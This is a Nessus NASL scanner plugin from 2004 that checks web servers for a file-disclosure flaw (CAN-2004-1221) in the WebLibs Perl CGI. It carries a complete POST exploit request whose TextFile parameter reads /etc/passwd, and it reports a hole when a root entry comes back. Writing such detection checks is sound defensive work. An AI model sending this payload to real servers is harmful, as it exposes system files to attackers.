#
# Script by Noam Rathaus GPLv2
#
# Remote Web Server Text File Viewing Vulnerability in WebLibs 1.0
# John Bissell <monkey321_1@hotmail.com>
# 2004-12-08 05:41

if(description)
{
 script_id(16168);
 script_version("$Revision: 1.2 $");
 script_cve_id("CAN-2004-1221");
 script_bugtraq_id(11848);
 
 name["english"] = "WebLibs File Disclosure";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running 'WebLibs', a CGI written in Perl.

Due to incorrect parsing of incoming data, an attacker can
cause the CGI to return arbitrary files as the result of the CGI.

Solution : Delete weblibs.pl
Risk factor: High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of a WebLibs File Disclosure";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


function check(loc)
{
 req = string("POST ", loc, "/weblibs.pl HTTP/1.1\r\n",
              "Host: ", get_host_name(), ":", port, "\r\n",
	      "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041207 Firefox/1.0 (Debian package 1.0-5)\r\n",
	      "Content-Type: application/x-www-form-urlencoded\r\n",
	      "Content-Length: 372\r\n",
	      "\r\n",
	      "TextFile=%2Fetc%2Fpasswd&Adjective+%231=a&Adjective+%232=a&Adjective+%233=a&Adjective+%234=a&Adjective+%235=a&Highland+Games+such+as+Stone+Mountain=a&Man%27s+Name=a&Noun+%231=a&Noun+%232=a&Noun+%233=a&Noun+%234=a&Noun+%235=a&Noun+%236=a&Noun+%237=a&Noun+%238=a&Plural+Noun+%231=a&Plural+Noun+%232=a&Plural+Noun+%233=a&Plural+Noun+%234=a&Plural+Noun+%235=a&Woman%27s+Name=a");
 r = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:r))
 {
  security_hole(port);
  exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}

